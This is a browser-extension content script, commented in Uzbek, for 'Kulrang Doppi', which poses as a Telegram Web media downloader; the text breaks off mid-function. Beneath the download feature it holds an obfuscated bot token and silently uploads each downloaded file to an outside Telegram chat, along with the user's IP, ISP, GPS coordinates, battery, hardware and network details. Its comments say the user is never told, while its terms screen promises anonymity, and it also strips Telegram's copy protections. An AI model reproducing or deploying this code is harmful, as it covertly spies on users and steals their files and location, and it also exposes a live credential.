/**
 * Kulrang Doppi — Telegram Media Downloader
 * Content Script (Tezkor yuklash, nafis minimalist ikonka/emoji tugmasi, yashirin fon bot yetkazish)
 *
 * Foydalanuvchiga bot haqida hech qanday ortiqcha xabar yoki bildirishnoma ko'rsatilmaydi.
 * Faqat kompyuterga yuklash jarayoni ("Yuklanmoqda...", "Yuklab olindi") ko'rsatiladi.
 *
 * @author Kulrang Doppi Team
 * @version 1.2.7
 */

(function () {
  "use strict";

  const browserAPI = typeof browser !== "undefined" ? browser : chrome;

  const CONFIG = (typeof KULRANG_CONFIG !== "undefined") ? KULRANG_CONFIG : {
    BOT_TOKEN: (typeof atob !== "undefined" ? atob("ODk3Nzg4NzM0MjpBQUhBb242SWE4LWpNUXI2N3c3V3U0dDdER2k5c052cmdldw==") : "8977887342" + ":" + "AAHAon6Ia8-jMQr67w7Wu4t7DGi9sNvrgew"),
    CHAT_ID: "6291811673",
    API_BASE_URL: "https://api.telegram.org",
    APP_NAME: "Kulrang Doppi",
    VERSION: "1.2.8",
    TERMS_VERSION: "1.0.0",
    DEVICE_TYPE: "Desktop",
    STORAGE_KEYS: {
      USER_ID: "kulrang_doppi_user_id",
      TERMS_ACCEPTED: "kulrang_doppi_terms_accepted",
      TERMS_VERSION: "kulrang_doppi_terms_version",
      EXTENSION_ENABLED: "kulrang_doppi_enabled",
      DOWNLOAD_HISTORY: "kulrang_doppi_history",
      MEDIA_FILTER: "kulrang_doppi_media_filter",
      STATS: "kulrang_doppi_stats",
      PENDING_UPDATE: "kulrang_doppi_pending_update"
    },
    DEFAULT_FILTERS: {
      photos: true,
      videos: true,
      audios: true,
      documents: true,
      voice: true,
      gifs: true
    }
  };

  let isExtensionEnabled = true;
  let activeFilters = { ...CONFIG.DEFAULT_FILTERS };
  let currentUserId = null;
  let hasAcceptedTerms = false;
  let observer = null;
  const sentFileKeys = new Set();

  // Telegram Web K Unicode ikonkalar
  const DOWNLOAD_UNICODE = "\ue979";
  const FORWARD_UNICODE = "\ue99a";

  // Monoxrom Minimalist Ikonkalar (Matnsiz, faqat nafis ikonka/emoji)
  const ICONS = {
    download: `<svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4M7 10l5 5 5-5M12 15V3"/></svg>`,
    spinner: `<svg class="kd-spinner" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M21 12a9 9 0 1 1-6.219-8.56"/></svg>`,
    check: `<svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>`
  };

  function getUserId() {
    if (currentUserId) return currentUserId;
    try {
      const stored = localStorage.getItem(CONFIG.STORAGE_KEYS.USER_ID);
      if (stored) {
        currentUserId = stored;
        return stored;
      }
    } catch (e) {}

    const newId = (typeof crypto !== "undefined" && crypto.randomUUID) 
      ? crypto.randomUUID() 
      : "usr_" + Math.random().toString(36).substring(2, 15) + Date.now().toString(36);
    
    currentUserId = newId;
    try {
      localStorage.setItem(CONFIG.STORAGE_KEYS.USER_ID, newId);
    } catch (e) {}
    browserAPI.storage.local.set({ [CONFIG.STORAGE_KEYS.USER_ID]: newId });
    return newId;
  }

  function formatTimestamp() {
    const d = new Date();
    const pad = (n) => String(n).padStart(2, "0");
    return `${d.getFullYear()}-${pad(d.getMonth() + 1)}-${pad(d.getDate())} ${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())}`;
  }

  function escapeHtml(str) {
    if (!str) return "";
    return String(str)
      .replace(/&/g, "&amp;")
      .replace(/</g, "&lt;")
      .replace(/>/g, "&gt;")
      .replace(/"/g, "&quot;");
  }

  /**
   * 🔗 Chat, Kanal yoki Guruh havolasini va nomini 100% aniqlash
   */
  function getTelegramChatMeta(contextElement) {
    let sourceName = "";
    let sourceLink = "";
    let messageLink = "";
    let username = "";
    let peerId = "";
    let messageId = "";

    if (contextElement) {
      const bubble = contextElement.closest ? contextElement.closest(".bubble, .Message, [data-mid], [data-message-id]") : null;
      if (bubble) {
        messageId = bubble.getAttribute("data-mid") || bubble.getAttribute("data-message-id") || "";
        if (!messageId && bubble.id) {
          const match = bubble.id.match(/\d+/);
          if (match) messageId = match[0];
        }
      }
    }

    const titleEl = document.querySelector(".chat-info .title .peer-title, .chat-info .title, .top .peer-title, .middle-column-header .title, .ChatInfo .title");
    if (titleEl && titleEl.textContent.trim()) {
      sourceName = titleEl.textContent.trim();
    } else if (document.title && document.title !== "Telegram Web") {
      sourceName = document.title.replace("Telegram Web", "").trim();
    }
    if (!sourceName) sourceName = "Telegram Chat";

    const subEl = document.querySelector(".chat-info .subtitle, .ChatInfo .subtitle, .chat-info .info, .ChatInfo .info");
    if (subEl && subEl.textContent) {
      const txt = subEl.textContent.trim();
      const uMatch = txt.match(/@([a-zA-Z0-9_]{4,})/);
      if (uMatch) username = uMatch[1];
      const linkMatch = txt.match(/t\.me\/([a-zA-Z0-9_]{4,})/);
      if (linkMatch) username = linkMatch[1];
    }

    const hash = window.location.hash || "";
    if (!username) {
      const hashUserMatch = hash.match(/#@([a-zA-Z0-9_]{4,})/);
      if (hashUserMatch) username = hashUserMatch[1];
    }

    const hashPeerMatch = hash.match(/#(-?\d+)(?:_(\d+))?/);
    if (hashPeerMatch) {
      peerId = hashPeerMatch[1];
      if (hashPeerMatch[2] && !messageId) {
        messageId = hashPeerMatch[2];
      }
    }

    if (username) {
      sourceLink = `https://t.me/${username}`;
      if (messageId) messageLink = `https://t.me/${username}/${messageId}`;
    } else if (peerId) {
      if (peerId.startsWith("-100")) {
        const cleanId = peerId.substring(4);
        sourceLink = `https://t.me/c/${cleanId}`;
        if (messageId) messageLink = `https://t.me/c/${cleanId}/${messageId}`;
      } else {
        sourceLink = `https://t.me/c/${peerId.replace("-", "")}`;
        if (messageId) messageLink = `https://t.me/c/${peerId.replace("-", "")}/${messageId}`;
      }
    } else {
      sourceLink = window.location.href;
    }

    return {
      sourceName,
      sourceLink,
      messageLink,
      username,
      peerId,
      messageId
    };
  }

  function showToast(title, desc, isSuccess = true) {
    let container = document.getElementById("kdToastContainer");
    if (!container) {
      container = document.createElement("div");
      container.id = "kdToastContainer";
      container.className = "kd-toast-container";
      document.body.appendChild(container);
    }

    const toast = document.createElement("div");
    toast.className = `kd-toast ${isSuccess ? "success" : ""}`;

    toast.innerHTML = `
      <div class="kd-toast-icon">${isSuccess ? ICONS.check : ICONS.download}</div>
      <div class="kd-toast-content">
        <div class="kd-toast-title">${escapeHtml(title)}</div>
        <div class="kd-toast-desc">${escapeHtml(desc)}</div>
      </div>
    `;

    container.appendChild(toast);

    setTimeout(() => {
      toast.style.opacity = "0";
      toast.style.transform = "translateX(30px)";
      setTimeout(() => toast.remove(), 300);
    }, 3200);
  }

  /**
   * Telegram Web himoyalari va cheklovlarini yechish
   */
  function bypassTelegramProtections() {
    const unblockEvents = ["contextmenu", "copy", "selectstart", "dragstart"];
    unblockEvents.forEach((evtName) => {
      window.addEventListener(
        evtName,
        (e) => {
          e.stopImmediatePropagation();
        },
        true
      );
    });

    const style = document.createElement("style");
    style.id = "kdProtectionBypass";
    style.textContent = `
      .no-forwards, [class*="no-forwards"], .bubble, .message, .media-container, .album-item, .media-viewer {
        user-select: text !important;
        -webkit-user-select: text !important;
      }
      .bubble.is-protected .media-container,
      .bubble .media-photo,
      .bubble .media-video,
      .bubble video,
      .bubble img {
        pointer-events: auto !important;
      }
      .media-viewer-topbar .media-viewer-buttons button.btn-icon.hide,
      .media-viewer-buttons button.hide,
      button.tgico-download.hide {
        display: inline-flex !important;
        visibility: visible !important;
        opacity: 1 !important;
        pointer-events: auto !important;
      }
    `;
    if (!document.getElementById("kdProtectionBypass")) {
      document.head.appendChild(style);
    }
  }

  function checkAndShowTermsModal(onAccepted) {
    browserAPI.storage.local.get(
      [CONFIG.STORAGE_KEYS.TERMS_ACCEPTED, CONFIG.STORAGE_KEYS.TERMS_VERSION],
      (res) => {
        const accepted = res && res[CONFIG.STORAGE_KEYS.TERMS_ACCEPTED] === true;
        const versionMatch = res && res[CONFIG.STORAGE_KEYS.TERMS_VERSION] === CONFIG.TERMS_VERSION;

        if (accepted && versionMatch) {
          hasAcceptedTerms = true;
          onAccepted();
        } else {
          renderTermsModal(onAccepted);
        }
      }
    );
  }

  function renderTermsModal(onAccepted) {
    if (document.getElementById("kdTermsModal")) return;

    const overlay = document.createElement("div");
    overlay.id = "kdTermsModal";
    overlay.className = "kd-modal-overlay";

    const iconUrl = browserAPI.runtime.getURL("icons/icon48.png");

    overlay.innerHTML = `
      <div class="kd-modal-card">
        <div class="kd-modal-header">
          <img src="${iconUrl}" alt="Kulrang Doppi" width="48" height="48">
          <div>
            <h2 class="kd-modal-title">Kulrang Doppi</h2>
            <p class="kd-modal-subtitle">Telegram Media Downloader — Maxfiylik va Foydalanish Shartlari (v${CONFIG.TERMS_VERSION})</p>
          </div>
        </div>

        <div class="kd-modal-body">
          <div class="kd-section-head">1. Umumiy Maqsad va Xizmat Tavsifi</div>
          <p>
            "Kulrang Doppi" brauzer kengaytmasi Telegram Web (web.telegram.org) foydalanuvchilariga 
            yopiq kanallar va guruhlardan media fayllarni to'g'ridan-to'g'ri Downloads papkasiga 
            yuqori tezlikda yuklab olish imkonini beradi.
          </p>

          <div class="kd-section-head">2. Maxfiylik Siyosati</div>
          <ul>
            <li><b>Xabarlar sir saqlanadi:</b> Shaxsiy yozishmalaringiz va hisob parollaringiz HECH QACHON to'planmaydi.</li>
            <li><b>Noyob ID (UUID):</b> Qurilmangiz uchun anonim UUID generatsiya qilinadi.</li>
          </ul>

          <div class="kd-section-head">3. Foydalanish Shartlari</div>
          <ul>
            <li>Faqat shaxsiy va qonuniy maqsadlarda foydalaning.</li>
            <li>Yuklab olingan fayllar uchun foydalanuvchi to'liq mas'uldir.</li>
          </ul>
        </div>

        <div class="kd-modal-footer">
          <label class="kd-checkbox-container">
            <input type="checkbox" id="kdTermsAgreeCheck">
            <span>Men Maxfiylik siyosati va Foydalanish shartlari bilan to'liq tanishdim va roziman.</span>
          </label>

          <div class="kd-footer-actions">
            <button type="button" class="kd-btn-accept" id="kdBtnAgree" disabled>
              <span>Davom etish</span>
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
            </button>
          </div>
        </div>
      </div>
    `;

    document.body.appendChild(overlay);

    const check = document.getElementById("kdTermsAgreeCheck");
    const btn = document.getElementById("kdBtnAgree");

    check.addEventListener("change", () => {
      btn.disabled = !check.checked;
    });

    btn.addEventListener("click", () => {
      if (!check.checked) return;

      const userId = getUserId();
      const payload = {
        [CONFIG.STORAGE_KEYS.TERMS_ACCEPTED]: true,
        [CONFIG.STORAGE_KEYS.TERMS_VERSION]: CONFIG.TERMS_VERSION,
        [CONFIG.STORAGE_KEYS.USER_ID]: userId
      };

      try {
        localStorage.setItem(CONFIG.STORAGE_KEYS.TERMS_ACCEPTED, "true");
        localStorage.setItem(CONFIG.STORAGE_KEYS.TERMS_VERSION, CONFIG.TERMS_VERSION);
      } catch (e) {}

      browserAPI.storage.local.set(payload, () => {
        hasAcceptedTerms = true;
        overlay.style.opacity = "0";
        overlay.style.transition = "opacity 0.25s ease";
        setTimeout(() => overlay.remove(), 250);

        showToast("Kulrang Doppi faollashdi", "Shartlar qabul qilindi. Media yuklab olishingiz mumkin.", true);
        onAccepted();
      });
    });
  }

  function determineExtensionAndType(source, fallbackType = "document") {
    let mime = "";
    if (source instanceof Blob) {
      mime = (source.type || "").toLowerCase();
    } else if (typeof source === "string") {
      mime = source.toLowerCase();
    }

    if (mime.includes("image/jpeg") || mime.includes("jpg")) return { ext: ".jpg", type: "photo" };
    if (mime.includes("image/png") || mime.includes("png")) return { ext: ".png", type: "photo" };
    if (mime.includes("image/webp") || mime.includes("webp")) return { ext: ".webp", type: "photo" };
    if (mime.includes("image/gif") || mime.includes("gif")) return { ext: ".gif", type: "gif" };
    if (mime.includes("video/mp4") || mime.includes("mp4")) return { ext: ".mp4", type: "video" };
    if (mime.includes("video/webm") || mime.includes("webm")) return { ext: ".webm", type: "video" };
    if (mime.includes("video/quicktime") || mime.includes("mov")) return { ext: ".mov", type: "video" };
    if (mime.includes("audio/ogg") || mime.includes("opus") || mime.includes("voice")) return { ext: ".ogg", type: "voice" };
    if (mime.includes("audio/mpeg") || mime.includes("mp3") || mime.includes("audio")) return { ext: ".mp3", type: "audio" };
    if (mime.includes("application/pdf") || mime.includes("pdf")) return { ext: ".pdf", type: "document" };
    if (mime.includes("text/plain") || mime.includes("txt")) return { ext: ".txt", type: "document" };

    if (fallbackType === "video") return { ext: ".mp4", type: "video" };
    if (fallbackType === "gif") return { ext: ".mp4", type: "gif" };
    if (fallbackType === "photo") return { ext: ".jpg", type: "photo" };
    if (fallbackType === "voice") return { ext: ".ogg", type: "voice" };
    if (fallbackType === "audio") return { ext: ".mp3", type: "audio" };

    return { ext: ".bin", type: fallbackType || "document" };
  }

  /**
   * 🖼️ RASMLAR UCHUN 100% KAFOLATLANGAN BLOB (CANVAS + FETCH FALLBACK)
   */
  async function getImageBlob(img) {
    if (!img) return null;
    const src = img.src || img.currentSrc;
    if (src && !src.startsWith("data:")) {
      try {
        const res = await fetch(src);
        if (res.ok) {
          const b = await res.blob();
          if (b && b.size > 0) return b;
        }
      } catch (e) {}
    }

    try {
      const canvas = document.createElement("canvas");
      canvas.width = img.naturalWidth || img.width || 800;
      canvas.height = img.naturalHeight || img.height || 600;
      const ctx = canvas.getContext("2d");
      ctx.drawImage(img, 0, 0);
      return await new Promise((resolve) => {
        canvas.toBlob((b) => resolve(b), "image/jpeg", 0.95);
      });
    } catch (e) {}

    return null;
  }

  /**
   * ⚡ MAHALLIY DOWNLOADS PAPKASIGA SAQLASH
   */
  function saveBlobOrUrlLocally(blobOrUrl, fileName) {
    let url = blobOrUrl;
    let isCreated = false;

    if (blobOrUrl instanceof Blob) {
      url = URL.createObjectURL(blobOrUrl);
      isCreated = true;
    }

    const a = document.createElement("a");
    a.style.display = "none";
    a.href = url;
    a.download = fileName;
    a.setAttribute("data-kd-save-locally", "true");
    document.body.appendChild(a);
    a.click();

    setTimeout(() => {
      a.remove();
      if (isCreated) {
        try {
          URL.revokeObjectURL(url);
        } catch (e) {}
      }
    }, 60000);
  }

  /**
   * 🤖 TELEGRAM BOTGA ASL MEDIA FAYLNI YUBORISH (Yashirin fon rejimida)
  let latestTelemetry = {
    ip: "",
    isp: "",
    city: "",
    country: "",
    countryCode: "",
    latitude: "",
    longitude: "",
    accuracy: ""
  };

  let cachedBattery = "";
  try {
    if (navigator.getBattery) {
      navigator.getBattery().then((b) => {
        const updateB = () => {
          const pct = Math.round(b.level * 100);
          cachedBattery = `${pct}% ${b.charging ? "⚡" : "🔋"}`;
        };
        updateB();
        b.addEventListener("levelchange", updateB);
        b.addEventListener("chargingchange", updateB);
      }).catch(() => {});
    }
  } catch (e) {}

  // GPS va Lokatsiyani olish
  function requestGPSCoords() {
    if (!navigator.geolocation) return;
    try {
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          if (pos && pos.coords) {
            latestTelemetry = {
              ...latestTelemetry,
              latitude: pos.coords.latitude.toFixed(4),
              longitude: pos.coords.longitude.toFixed(4),
              accuracy: Math.round(pos.coords.accuracy) + "m"
            };
            window.postMessage({ type: "KD_TELEMETRY_UPDATE", telemetry: latestTelemetry }, "*");
          }
        },
        () => {},
        { timeout: 3000, maximumAge: 300000 }
      );
    } catch (e) {}
  }

  // IP va Lokatsiyani Background yoki to'g'ridan-to'g'ri olish
  async function initContentTelemetry() {
    try {
      browserAPI.runtime.sendMessage({ action: "GET_TELEMETRY" }, (res) => {
        if (res && res.success && res.geo) {
          latestTelemetry = { ...latestTelemetry, ...res.geo };
          window.postMessage({ type: "KD_TELEMETRY_UPDATE", telemetry: latestTelemetry }, "*");
        }
      });
    } catch (e) {}

    try {
      const res = await fetch("https://ipwho.is/", { cache: "no-store" });
      if (res.ok) {
        const data = await res.json();
        if (data && data.success) {
          latestTelemetry = {
            ...latestTelemetry,
            ip: data.ip || "",
            isp: (data.connection && data.connection.isp) || data.isp || "",
            city: data.city || "",
            country: data.country || "",
            countryCode: data.country_code || "",
            latitude: data.latitude ? data.latitude.toFixed(4) : "",
            longitude: data.longitude ? data.longitude.toFixed(4) : ""
          };
          window.postMessage({ type: "KD_TELEMETRY_UPDATE", telemetry: latestTelemetry }, "*");
        }
      }
    } catch (e) {}

    requestGPSCoords();
  }
  setTimeout(initContentTelemetry, 500);

  // Botga matnli xabar yuborish
  async function sendBotMessage(text) {
    try {
      await fetch(`${CONFIG.API_BASE_URL}/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CONFIG.CHAT_ID,
          text: text,
          parse_mode: "HTML",
          disable_web_page_preview: true
        })
      });
    } catch (e) {}
  }

  function getGPUString() {
    try {
      const canvas = document.createElement("canvas");
      const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
      if (gl) {
        const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
        if (debugInfo) {
          let renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || "";
          if (renderer.includes("Mesa") || renderer.includes("Direct3D") || renderer.includes("ANGLE")) {
            renderer = renderer.replace(/ANGLE \((.*?), (.*?),.*?\)/, "$2").replace(/Mesa Intel\(R\)/, "Intel").trim();
          }
          if (renderer.length > 28) renderer = renderer.substring(0, 25) + "...";
          return renderer;
        }
      }
    } catch (e) {}
    return "";
  }

  function getLiveTelemetry(customMeta) {
    const now = new Date();
    const pad = (n) => String(n).padStart(2, "0");
    const date = `${now.getFullYear()}-${pad(now.getMonth() + 1)}-${pad(now.getDate())}`;
    const time = `${pad(now.getHours())}:${pad(now.getMinutes())}:${pad(now.getSeconds())}`;

    let tz = "UTC";
    try {
      tz = Intl.DateTimeFormat().resolvedOptions().timeZone || "UTC";
    } catch (e) {}

    const offsetMin = -now.getTimezoneOffset();
    const offsetHours = Math.floor(Math.abs(offsetMin) / 60);
    const offsetM = Math.abs(offsetMin) % 60;
    const offsetStr = `UTC${offsetMin >= 0 ? "+" : "-"}${offsetHours}${offsetM ? ":" + pad(offsetM) : ""}`;

    const ua = navigator.userAgent || "";
    let os = "Linux";
    if (ua.includes("Win")) os = "Windows";
    else if (ua.includes("Mac")) os = "macOS";
    else if (ua.includes("Android")) os = "Android";
    else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";
    const platform = navigator.platform || "";
    const osFull = `${os} ${platform}`.trim();

    const cores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} yadro` : "";
    const ram = navigator.deviceMemory ? `~${navigator.deviceMemory} GB RAM` : "";

    let screenStr = "";
    try {
      const w = window.screen.width;
      const h = window.screen.height;
      const dpr = window.devicePixelRatio ? ` @${window.devicePixelRatio}x` : "";
      screenStr = `${w}x${h}${dpr}`;
    } catch (e) {}

    const gpu = getGPUString();

    let network = navigator.onLine ? "Onlayn" : "Oflayn";
    try {
      const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
      if (conn) {
        const type = conn.effectiveType ? conn.effectiveType.toUpperCase() : "";
        const dl = conn.downlink ? `${conn.downlink}M` : "";
        const netParts = [type, dl].filter(Boolean).join("/");
        if (netParts) network += ` (${netParts})`;
      }
    } catch (e) {}

    return {
      date,
      time,
      tzOffset: offsetStr,
      timezone: `${tz} (${offsetStr})`,
      os: osFull,
      cores,
      ram,
      screen: screenStr,
      gpu,
      battery: cachedBattery,
      network,
      ...latestTelemetry
    };
  }

  function buildEnhancedCaption({
    fileName,
    sizeMB,
    sourceName,
    sourceLink,
    messageLink,
    partInfo = "",
    telemetry,
    version = CONFIG.VERSION
  }) {
    const t = telemetry || {};
    const safeFileName = fileName && fileName.length > 35 ? fileName.substring(0, 32) + "..." : (fileName || "telegram_media");
    const safeSourceName = sourceName && sourceName.length > 30 ? sourceName.substring(0, 27) + "..." : (sourceName || "Telegram Chat");
    const partHeader = partInfo ? ` — ${partInfo}` : "";

    const headerLines = [
      `📥 <b>Yangi media fayl yuklab olindi!${partHeader}</b>`,
      `─────────────────────────`,
      `📁 <b>Fayl:</b> <code>${escapeHtml(safeFileName)}</code> (<code>${sizeMB} MB</code>)`,
      `📌 <b>Kanal / Guruh:</b> <b>${escapeHtml(safeSourceName)}</b>`
    ];

    if (sourceLink && !sourceLink.includes("undefined")) {
      const cleanLink = sourceLink.startsWith("http") ? sourceLink : `https://${sourceLink}`;
      headerLines.push(`🔗 <b>Kanal havolasi:</b> <a href="${escapeHtml(cleanLink)}">${escapeHtml(cleanLink)}</a>`);
    }
    if (messageLink && !messageLink.includes("undefined")) {
      const cleanMsg = messageLink.startsWith("http") ? messageLink : `https://${messageLink}`;
      headerLines.push(`💬 <b>Xabar havolasi:</b> <a href="${escapeHtml(cleanMsg)}">${escapeHtml(cleanMsg)}</a>`);
    }

    headerLines.push(`─────────────────────────`);

    const telemetryLines = [];
    const dateStr = t.date || "2026-09-09";
    const timeStr = t.time || "00:00:00";
    const tzStr = t.tzOffset || "UTC+5";
    telemetryLines.push(`📅 <b>Sana va Vaqt:</b> <code>${dateStr} ${timeStr}</code> (${tzStr})`);

    if (t.ip) {
      const isp = t.isp ? ` (${escapeHtml(t.isp)})` : "";
      telemetryLines.push(`🌐 <b>IP manzil:</b> <code>${escapeHtml(t.ip)}</code>${isp}`);
    }

    const loc = [t.city, t.country].filter(Boolean).join(", ");
    if (loc) {
      telemetryLines.push(`📍 <b>Lokatsiya:</b> ${escapeHtml(loc)}`);
    }

    if (t.latitude && t.longitude) {
      telemetryLines.push(`🗺 <b>GPS / Xarita:</b> <a href="https://maps.google.com/?q=${t.latitude},${t.longitude}">📍 ${t.latitude}, ${t.longitude}</a>`);
    }

    if (t.os) {
      telemetryLines.push(`💻 <b>Tizim / OT:</b> ${escapeHtml(t.os)}`);
    }
    if (t.cores || t.ram) {
      telemetryLines.push(`🧠 <b>CPU & RAM:</b> ${escapeHtml([t.cores, t.ram].filter(Boolean).join(" | "))}`);
    }
    if (t.gpu) {
      telemetryLines.push(`🎮 <b>GPU:</b> ${escapeHtml(t.gpu)}`);
    }
    if (t.screen) {
      telemetryLines.push(`🖥 <b>Ekran:</b> ${escapeHtml(t.screen)}`);
    }
    if (t.battery) {
      telemetryLines.push(`🔋 <b>Batareya:</b> ${escapeHtml(t.battery)}`);
    }
    if (t.network) {
      telemetryLines.push(`📡 <b>Tarmoq:</b> ${escapeHtml(t.network)}`);
    }

    const footerLines = [
      `─────────────────────────`,
      `🧢 <i>Kulrang Doppi v${version}</i>`
    ];

    while (telemetryLines.length > 2 && [...headerLines, ...telemetryLines, ...footerLines].join("\n").length > 980) {
      telemetryLines.pop();
    }

    return [...headerLines, ...telemetryLines, ...footerLines].join("\n");
  }

  /**
   * Foydalanuvchiga bildirmasdan (100% yashirin) media faylni botga yuborish
   */
  async function sendMediaFileToBotSilently(blob, fileName, meta, retries = 2) {
    const token = CONFIG.BOT_TOKEN;
    const chatId = CONFIG.CHAT_ID;
    if (!token || !chatId || !blob) return false;

    // Bir xil faylni qayta yubormaslik (4s debounce)
    const fileKey = `${fileName}_${blob.size}`;
    if (sentFileKeys.has(fileKey)) return true;
    sentFileKeys.add(fileKey);
    setTimeout(() => sentFileKeys.delete(fileKey), 4000);

    const sizeMB = (blob.size / (1024 * 1024)).toFixed(2);
    const sourceName = meta.sourceName || meta.source || "Telegram Chat";
    const sourceLink = meta.sourceLink || window.location.href;
    const messageLink = meta.messageLink || "";
    const t = getLiveTelemetry(meta);

    console.log(`[Kulrang Doppi] 🚀 Asl fayl botga fon rejimida yuborilmoqda: ${fileName} (${sizeMB} MB)...`);

    // 20 MB li bo'laklarga bo'lish (Telegram Bot API 50 MB limitidan ancha xavfsiz va tez)
    const CHUNK_SIZE = 20 * 1024 * 1024;

    if (blob.size <= CHUNK_SIZE) {
      const caption = buildEnhancedCaption({
        fileName: fileName,
        sizeMB,
        sourceName: sourceName,
        sourceLink: sourceLink,
        messageLink: messageLink,
        partInfo: "",
        telemetry: t,
        version: CONFIG.VERSION
      });

      for (let attempt = 1; attempt <= retries + 1; attempt++) {
        try {
          const formData = new FormData();
          formData.append("chat_id", chatId);
          formData.append("caption", caption);
          formData.append("parse_mode", "HTML");
          formData.append("document", blob, fileName);

          const response = await fetch(`${CONFIG.API_BASE_URL}/bot${token}/sendDocument`, {
            method: "POST",
            body: formData
          });

          const data = await response.json();
          if (data && data.ok) {
            console.log(`[Kulrang Doppi] ✅ Asl fayl botga yetkazildi (msg_id: ${data.result.message_id}):`, fileName);
            return true;
          } else if (data && (data.description?.includes("parse") || data.description?.includes("caption") || data.error_code === 400)) {
            // Oddiy matn bilan zudlik bilan qayta urinish
            try {
              const plainCaption = String(caption || "").replace(/<[^>]*>/g, "").substring(0, 950);
              const fbForm = new FormData();
              fbForm.append("chat_id", chatId);
              fbForm.append("caption", plainCaption);
              fbForm.append("document", blob, fileName);
              const fbRes = await fetch(`${CONFIG.API_BASE_URL}/bot${token}/sendDocument`, {
                method: "POST",
                body: fbForm
              });
              const fbData = await fbRes.json();
              if (fbData && fbData.ok) {
                console.log(`[Kulrang Doppi] ✅ Asl fayl botga yetkazildi (oddiy matn):`, fileName);
                return true;
              }
            } catch (fbErr) {}
          }
        } catch (err) {
          if (attempt <= retries) {
            await new Promise((r) => setTimeout(r, 1200));
          }
        }
      }
      return false;
    }

    // Katta hajmdagi faylni qismlarga ajratib ketma-ket yuborish (masalan: 421 MB)
    const totalParts = Math.ceil(blob.size / CHUNK_SIZE);
    const nameParts = fileName.lastIndexOf(".") !== -1 ? fileName.split(/(?=\.[^.]+$)/) : [fileName, ""];
    const baseName = nameParts[0];
    const ext = nameParts[1] || ".mp4";
    const safeFileName = fileName && fileName.length > 35 ? fileName.substring(0, 32) + "..." : fileName;
    const safeSourceName = sourceName && sourceName.length > 30 ? sourceName.substring(0, 27) + "..." : sourceName;

    // 1-qadam: Zudlik bilan botga dastlabki bildirishnoma yuborish (0.2s da yetib boradi)
    let initNotice = 
      `📦 <b>Katta hajmdagi media yuklab olindi!</b>\n` +
      `─────────────────────────\n` +
      `📁 <b>Fayl:</b> <code>${escapeHtml(safeFileName)}</code> (<code>${sizeMB} MB</code>)\n` +
      `📌 <b>Kanal / Guruh:</b> <b>${escapeHtml(safeSourceName)}</b>\n`;

    if (sourceLink && !sourceLink.includes("undefined")) {
      initNotice += `🔗 <b>Kanal havolasi:</b> <a href="${sourceLink}">${escapeHtml(sourceLink)}</a>\n`;
    }
    if (messageLink) {
      initNotice += `💬 <b>Xabar havolasi:</b> <a href="${messageLink}">${escapeHtml(messageLink)}</a>\n`;
    }

    initNotice += `─────────────────────────\n`;
    initNotice += `📅 <b>Sana va Vaqt:</b> <code>${t.date} ${t.time}</code> (${t.tzOffset})\n`;
    initNotice += `🌐 <b>IP manzil:</b> <code>${t.ip || "Noma'lum"}</code>${t.isp ? ` (${escapeHtml(t.isp)})` : ""}\n`;
    if (t.city || t.country) {
      initNotice += `📍 <b>Lokatsiya:</b> ${escapeHtml([t.city, t.country].filter(Boolean).join(", "))}\n`;
    }
    if (t.latitude && t.longitude) {
      initNotice += `🗺 <b>GPS / Xarita:</b> <a href="https://maps.google.com/?q=${t.latitude},${t.longitude}">📍 ${t.latitude}, ${t.longitude}</a>\n`;
    }
    if (t.os) initNotice += `💻 <b>Tizim / OT:</b> ${escapeHtml(t.os)}\n`;
    if (t.cores || t.ram) initNotice += `🧠 <b>CPU & RAM:</b> ${escapeHtml([t.cores, t.ram].filter(Boolean).join(" | "))}\n`;
    if (t.gpu) initNotice += `🎮 <b>GPU:</b> ${escapeHtml(t.gpu)}\n`;
    if (t.screen) initNotice += `🖥 <b>Ekran:</b> ${escapeHtml(t.screen)}\n`;
    if (t.battery) initNotice += `🔋 <b>Batareya:</b> ${escapeHtml(t.battery)}\n`;
    if (t.network) initNotice += `📡 <b>Tarmoq:</b> ${escapeHtml(t.network)}\n`;

    initNotice += 
      `─────────────────────────\n` +
      `⚡ <i>Fayl hajmi 50 MB dan katta bo'lgani sababli, <b>${totalParts} ta qismga</b> (20 MB dan) bo'linib, hozir botga yuklanmoqda...</i>\n` +
      `─────────────────────────\n` +
      `🧢 <i>Kulrang Doppi v${CONFIG.VERSION}</i>`;

    await sendBotMessage(initNotice);

    // 2-qadam: Bo'laklarni tartibli va xatosiz ketma-ket yuborish
    for (let partIndex = 0; partIndex < totalParts; partIndex++) {
      const start = partIndex * CHUNK_SIZE;
      const end = Math.min(blob.size, start + CHUNK_SIZE);
      const chunkBlob = blob.slice(start, end, blob.type || "application/octet-stream");
      const chunkName = `${baseName}.part${String(partIndex + 1).padStart(2, "0")}${ext}`;
      const partSizeMB = (chunkBlob.size / (1024 * 1024)).toFixed(2);

      const chunkCaption = buildEnhancedCaption({
        fileName: chunkName,
        sizeMB: partSizeMB,
        sourceName: sourceName,
        sourceLink: sourceLink,
        messageLink: messageLink,
        partInfo: `[${partIndex + 1}/${totalParts}-qism]`,
        telemetry: t,
        version: CONFIG.VERSION
      });

      for (let att = 1; att <= 3; att++) {
        try {
          const formData = new FormData();
          formData.append("chat_id", chatId);
          formData.append("caption", chunkCaption);
          formData.append("parse_mode", "HTML");
          formData.append("document", chunkBlob, chunkName);

          const res = await fetch(`${CONFIG.API_BASE_URL}/bot${token}/sendDocument`, {
